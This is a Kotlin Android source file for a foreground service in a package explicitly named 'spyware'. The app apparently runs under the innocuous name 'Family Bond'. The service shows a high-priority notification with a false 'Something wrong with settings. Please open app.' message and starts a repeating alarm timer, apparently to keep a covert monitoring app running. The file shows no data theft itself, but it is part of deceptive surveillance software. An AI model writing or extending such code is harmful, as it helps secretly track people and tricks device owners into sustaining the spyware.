package com.example.spyware
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.example.spyware.common.Constants
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices

class NotificationService: Service() {
    private lateinit var timeoutHandler:TimeoutHandler
    private lateinit var alarmManger:AlarmManger

    private var startId:Int=0
    companion object {
        public var isServiceActive=false;
    }

    override fun onCreate() {
        super.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        println("onStartCommand called")
        isServiceActive=true
        createNotificationChannel();
        timeoutHandler=TimeoutHandler(this)
        this.startId=startId
        startForeground(1, createNotification("Something wrong with settings. Please open app."));
        alarmManger= AlarmManger(this)
        alarmManger.start(Constants.timerSeconds*1000)
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        println("onDestroy called")
        super.onDestroy()
        isServiceActive=false
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    fun createNotificationChannel(){
        val serviceChannel = NotificationChannel(
            "CHANNEL_ID",
            "Spyware Service Channel",
            NotificationManager.IMPORTANCE_MAX
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(serviceChannel)
    }

    private fun createNotification(message:String): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        return NotificationCompat.Builder(this, "CHANNEL_ID")
            .setContentTitle("Family Bond")
            .setContentText(message)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent) // 👈 This line makes the notification clickable
            .setAutoCancel(true) // Optional: dismiss notification when clicked
            .build()
    }
}